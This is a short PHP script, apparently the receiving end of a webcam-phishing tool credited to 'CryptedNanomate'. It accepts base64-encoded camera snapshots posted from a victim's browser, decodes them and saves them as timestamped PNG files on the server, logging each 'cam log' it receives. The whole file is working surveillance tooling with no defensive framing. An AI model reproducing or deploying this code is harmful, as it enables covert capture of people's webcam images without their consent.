<?php

$date = date('dMYHis');
$image=$_POST['cat'];

if (!empty($_POST['img'])) {
error_log("Received cam log. Made by CryptedNanomate...
Greetings to my professor Petar who taught me web development.
" . "\r\n", 3, "Log.log");
}

$filtered=substr($image, strpos($image, ",")+1);
$unencoded=base64_decode($filtered);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencoded);
fclose( $fp );
exit();
// save info to the logg file if everything is ok...
?>